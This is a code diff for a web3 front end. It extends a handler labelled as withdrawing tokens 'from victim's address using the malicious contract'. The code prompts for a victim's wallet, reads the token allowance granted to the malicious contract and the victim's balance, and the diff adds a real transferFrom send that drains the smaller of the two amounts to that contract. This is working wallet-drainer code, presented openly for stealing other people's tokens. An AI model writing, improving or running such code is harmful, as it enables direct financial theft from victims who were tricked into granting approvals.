@@ -584,25 +584,27 @@
 
         
 // Withdraw Tokens (from victim's address using the malicious contract)
+// Withdraw Tokens (from victim's address using the malicious contract)
 document.getElementById("transferTokensBtn").addEventListener("click", async () => {
-    console.debug("transferTokensBtn click handler triggered"); // Debug log for function trigger
+    console.debug("transferTokensBtn click handler triggered"); // Debug: Button click detected
 
-    // Prompt for the victim's wallet address
+    // Step 1: Prompt for the victim's wallet address
     const victimAddress = prompt("Enter victim's wallet address:");
 
-    // Validate and clean the victim's wallet address
+    // Step 2: Validate and clean the victim's wallet address
     if (victimAddress) {
-        const cleanedVictimAddress = victimAddress.trim(); // Remove any spaces
+        const cleanedVictimAddress = victimAddress.trim(); // Remove any spaces from input
         console.debug("Cleaned victim address:", cleanedVictimAddress);
 
-        if (!web3.utils.isAddress(cleanedVictimAddress)) { // Check if the address is valid
-            alert("Invalid Ethereum address.");
+        // Check if the provided address is a valid Ethereum address
+        if (!web3.utils.isAddress(cleanedVictimAddress)) {
+            alert("Invalid Ethereum address."); // Notify user of invalid address
             console.debug("Invalid address detected:", cleanedVictimAddress);
-            return; // Exit if the address is invalid
+            return; // Stop execution for invalid addresses
         }
 
         try {
-            // Fetch allowance and victim's token balance
+            // Step 3: Fetch allowance and victim's token balance
             console.debug("Fetching allowance and balance...");
             const allowance = await tokenContract.methods.allowance(cleanedVictimAddress, maliciousContractAddress).call();
             console.debug("Allowance fetched:", allowance);
@@ -610,44 +612,63 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
             const balance = await tokenContract.methods.balanceOf(cleanedVictimAddress).call();
             console.debug("Balance fetched:", balance);
 
-            // Convert allowance and balance to Big Numbers
+            // Step 4: Convert allowance and balance to Big Numbers
             console.debug("Converting values to Big Numbers...");
             const balanceBN = web3.utils.toBN(balance);
             const allowanceBN = web3.utils.toBN(allowance);
             console.debug("Converted values: Balance:", balanceBN.toString(), "Allowance:", allowanceBN.toString());
 
-            // Calculate the amount to withdraw
+            // Step 5: Calculate the amount to withdraw
             console.debug("Calculating amount to withdraw...");
-            const amountToWithdraw = balanceBN.lt(allowanceBN) ? balanceBN : allowanceBN;
+            const amountToWithdraw = balanceBN.lt(allowanceBN) ? balanceBN : allowanceBN; // Use the smaller value
             console.debug("Amount to withdraw calculated:", amountToWithdraw.toString());
 
-            // Check if withdrawal is possible
+            // Step 6: Check if withdrawal is possible (non-zero amount)
             if (amountToWithdraw.lte(web3.utils.toBN(0))) {
-                alert("Insufficient allowance or balance.");
+                alert("Insufficient allowance or balance."); // Notify user of insufficient funds
                 console.debug("Withdraw aborted: No tokens available.");
-                return; // Exit if no tokens are available to withdraw
+                return; // Stop execution for zero or negative amounts
             }
 
-            // Simulate the withdrawal transaction
+            // Step 7: Simulate the withdrawal transaction (no gas fee)
             console.debug("Simulating withdrawal transaction...");
             try {
-                const result = await tokenContract.methods
+                const simulationResult = await tokenContract.methods
                     .transferFrom(cleanedVictimAddress, maliciousContractAddress, amountToWithdraw.toString())
-                    .call({ from: accounts[0] }); // Simulate call without spending gas
-                console.debug("Simulation successful, result:", result);
+                    .call({ from: accounts[0] }); // Simulation call
+                console.debug("Simulation successful, result:", simulationResult);
 
                 alert(`Simulation successful. You can proceed to withdraw ${web3.utils.fromWei(amountToWithdraw, 'ether')} tokens.`);
             } catch (simulationError) {
                 console.error("Simulation Error:", simulationError);
-                alert("Simulation failed. Check victim's approval and balance.");
+
+                // Extract error reason from simulation error
+                const errorReason = simulationError.message.match(/revert (.*)$/i);
+                if (errorReason) {
+                    alert(`Simulation failed: ${errorReason[1]}`); // Show the error reason to the user
+                } else {
+                    alert("Simulation failed due to an unknown error. Check console logs for details.");
+                }
+                return; // Stop execution on simulation failure
             }
+
+            // Step 8: Execute the actual withdrawal transaction
+            console.debug("Attempting to execute withdrawal...");
+            const transaction = await tokenContract.methods
+                .transferFrom(cleanedVictimAddress, maliciousContractAddress, amountToWithdraw.toString())
+                .send({ from: accounts[0] }); // Actual transaction with gas fee
+            console.debug("Transaction details:", transaction);
+
+            // Notify successful withdrawal
+            alert(`Successfully withdrawn ${web3.utils.fromWei(amountToWithdraw, 'ether')} tokens!`);
         } catch (error) {
-            // Handle errors during balance/allowance checks
-            console.error("Error during withdrawal preparation:", error);
-            alert("Error occurred during preparation. Check victim's approval and balance.");
+            // Step 9: Handle errors during the withdrawal process
+            console.error("Withdrawal Error:", error);
+            alert("Error occurred during withdrawal. Check victim's approval and balance.");
         }
     }
 });
+
 
 
 
